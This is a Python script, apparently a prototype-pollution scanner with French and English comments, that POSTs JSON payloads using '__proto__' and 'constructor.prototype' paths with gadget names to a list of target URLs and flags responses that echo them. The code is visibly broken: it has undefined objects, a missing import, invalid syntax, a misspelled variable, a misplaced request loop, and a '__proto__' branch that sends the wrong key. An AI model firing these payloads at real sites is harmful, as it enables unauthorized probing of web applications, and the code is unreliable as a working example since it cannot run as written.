import requests
import colorama
import argparse

url_group = parser.add_mutually_exclusive_group(required=True) 
    url_group.add_argument("-u", "--url", type=str, help="Single URL to scan")
    url_group.add_argument("-f", "--file", type=str, help="File containing URLs")   
    url_group.add_argument("-g", "--gadgets", type=str, help="Fichier  des gadgets",)


args = url_group.parse_args()

# Lecture des arguments URL

if args.url:
    urls = [args.url]
    print("Here is the url to test :" + {urls})

elif args.file:
    with open(args.file, "r") as urlsfile:
        urls = [line.strip() for line in urlsfile.readlines()]
    print("Here is your list of urls :" + {urls})

if not args.url and not args.file:  
    parser.print_help()
    exit()

# Lecture des gadgets et proto

#if args.payloads:
#    with open(args.payloads, "r") as payloadsfile:
#        payloads = [line.strip() for line in payloadsfile.readlines()]
#    print("Here are your payloads :" + {payloads})

if args.gadgets :
    with open(args.gadgets, "r") as gadgetsfile:
 	       	gadgets = [line.strip() for line in gadgetsfile.readlines()]
 	print("Here are your gadgets :[" + {gadgets})

if not args.payloads:  # and not args.gadgets: 
    parser.print_help()
    exit()

# Les choses commencent ici !
all_results = []  
pollution_paths = [
    "__proto__",
    "constructor.prototype",
    "prototype"
]

def inject_payload(url, payload):
    try:
        response = requests.post(url, json=payload)
        return response
    except Exception as e:
        print(f"Erreur when the program was trying the payload {url} : {e}")
        return None

@dataclass
class Resultats:  
        url = url
        vuln = False
        gadgets: list = field(default_factory=list)

for url in urls:
    res = Resultats(url)  
    for path in pollution_paths:
        for gadget in gadgets:
            if path == "__proto__":
                payload = {"prototype": {gadget: "yes"}}
            elif path == "constructor.prototype":
                payload = {"constructor": {"prototype": {gadget: "polluted"}}}
            else path == "prototype":
                payload = {"prototype": {gadget: "polluted"}}
        pollutedrequest = inject_payload(url, payload)
        if polluedrequest and gadget in pollutedrequest.text: 
            res.vuln = True
            print("The request has been polluted ! " + pollutedrequest.text)
        else:
            print("It seems that the request has not been polluted...")

    all_results.append(res)  

print(all_results)  

